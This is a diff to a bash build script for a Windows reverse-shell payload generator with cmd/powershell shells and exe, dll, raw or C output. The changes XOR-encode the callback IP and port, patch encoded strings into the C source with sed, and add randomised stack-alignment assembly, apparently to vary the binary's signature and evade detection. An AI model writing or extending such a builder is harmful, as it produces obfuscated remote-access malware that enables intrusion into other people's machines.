@@ -25,7 +25,7 @@ Options:
   -p, --port      listening port
   -t, --type      shell type {cmd, powershell}
   -f, --format    payload format {c, exe, dll, raw}
-  -o, --output    output path
+  -o, --output    output file path
   -h, --help      show this help message
 EOF
   exit 1
@@ -155,21 +155,47 @@ encode_ws2_string() {
   printf '%s' "$enc"
 }
 
-format_and_validate_ip() {
-  # ensure IPv4 and range
-  IFS=. read -r o0 o1 o2 o3 <<< "$ip" || { echo "Invalid IPv4: $ip" >&2; exit 1; }
+format_and_validate_addr() {
+  # --- validate IP ---
+  IFS=. read -r o0 o1 o2 o3 <<< "$ip" || {
+    echo "Invalid IPv4: $ip" >&2; exit 1;
+  }
+
   for o in "$o0" "$o1" "$o2" "$o3"; do
-    [[ "$o" =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || { echo "Invalid IPv4: $ip" >&2; exit 1; }
+    [[ "$o" =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || {
+      echo "Invalid IPv4: $ip" >&2; exit 1;
+    }
   done
 
-  # XOR each octet with xor_key2 and format array (keeps original behaviour)
+  # --- validate port ---
+  [[ "$port" =~ ^[0-9]+$ ]] || {
+    echo "Invalid port: $port" >&2; exit 1;
+  }
+
+  (( port >= 1 && port <= 65535 )) || {
+    echo "Invalid port: $port" >&2; exit 1;
+  }
+
+  # --- split port to network byte order ---
+  local port_hi=$(( (port >> 8) & 0xFF ))
+  local port_lo=$(( port & 0xFF ))
+
+  # --- XOR key ---
   local k=$(( xor_key2 & 0xFF ))
+
+  # --- XOR encode everything ---
   local b0=$(( (10#$o0 ^ k) & 0xFF ))
   local b1=$(( (10#$o1 ^ k) & 0xFF ))
   local b2=$(( (10#$o2 ^ k) & 0xFF ))
   local b3=$(( (10#$o3 ^ k) & 0xFF ))
-  printf -v ip_array "{0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x}" "$b0" "$b1" "$b2" "$b3" "$k"
+  local p0=$(( (port_hi ^ k) & 0xFF ))
+  local p1=$(( (port_lo ^ k) & 0xFF ))
+
+  printf -v addr_array \
+    "{0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x}" \
+    "$b0" "$b1" "$b2" "$b3" "$p0" "$p1" "$k"
 }
+
 
 encode_shell_string() {
   if [ "$shell_type" == "cmd" ]; then
@@ -191,15 +217,14 @@ encode_shell_string() {
 
 # -------- patch source and build --------
 patch_source_values() {
-  local ws2_enc shell_enc ip_arr
+  local ws2_enc shell_enc addr_enc
   ws2_enc="$(encode_ws2_string)"
   shell_enc="$(encode_shell_string)"
-  ip_arr="$ip_array"
+  addr_enc="$addr_array"
 
-  sed -i "s/char cmd\[\] = .*;/char cmd[] = $shell_enc;/" "$filename"
+  sed -i "s/char shell\[\] = .*;/char shell[] = $shell_enc;/" "$filename"
   sed -i "s/char ws2_32_dll\[\] = .*;/char ws2_32_dll[] = $ws2_enc;/" "$filename"
-  sed -i "s/unsigned char ip\[\] = .*;/unsigned char ip\[\] = $ip_arr;/g" "$filename"
-  sed -i "s/int port =.*;/int port = $port ;/g" "$filename"
+  sed -i "s/unsigned char addr\[\] = .*;/unsigned char addr[] = $addr_array;/" "$filename"
 }
 
 build_targets() {
@@ -231,31 +256,82 @@ cleanup_artifacts() {
   make -C src clean > /dev/null 2>&1 || true
 }
 
+# -------- generate alignstack.asm --------
+gen_alignstack() {
+
+    REGISTERS=(rbx rsi rdi r12 r13 r14 r15)
+
+    BACKUP_METHODS=(
+        "mov {REG}, rsp"
+        "lea {REG}, [rsp]"
+    )
+
+    ALIGN_METHODS=(
+        "and rsp, -16"
+        "sub rsp, 8\n    and rsp, -16"
+        "add rsp, -8\n    and rsp, -16"
+    )
+
+    SHADOW_METHODS=(
+        "sub rsp, 32"
+        "add rsp, -32"
+        "lea rsp, [rsp - 32]"
+    )
+
+    RESTORE_METHODS=(
+        "mov rsp, {REG}"
+        "lea rsp, [{REG}]"
+    )
+
+    pick() {
+        local arr=("$@")
+        echo -e "${arr[$RANDOM % ${#arr[@]}]}"
+    }
+
+    REG=$(pick "${REGISTERS[@]}")
+    BACKUP=$(pick "${BACKUP_METHODS[@]}")
+    ALIGN=$(pick "${ALIGN_METHODS[@]}")
+    SHADOW=$(pick "${SHADOW_METHODS[@]}")
+    RESTORE=$(pick "${RESTORE_METHODS[@]}")
+
+    BACKUP="${BACKUP//\{REG\}/$REG}"
+    RESTORE="${RESTORE//\{REG\}/$REG}"
+
+    cat > src/alignstack.asm <<EOF
+extern Main
+global alignstack
+
+section .text
+alignstack:
+    push $REG
+    $BACKUP
+    $ALIGN
+    $SHADOW
+    call Main
+    $RESTORE
+    pop $REG
+    ret
+EOF
+}
+
 # -------- main flow --------
 main() {
   print_banner
   parse_args "$@"
   validate_inputs
 
+  gen_alignstack
+  
   gen_xor_keys
   patch_keys_in_source
 
   gen_seed_and_hashes
   patch_hashes_in_source
 
-  # encoders / formatters
-  local ws2_enc shell_enc
-  ws2_enc="$(encode_ws2_string)"   # used inside patch_source_values
-  format_and_validate_ip
-  shell_enc="$(encode_shell_string)"
-
-  # patch values into C source
+  format_and_validate_addr
   patch_source_values
 
-  # perform build steps and produce output
   build_targets
-
-  # cleanup
   cleanup_artifacts
 }
 
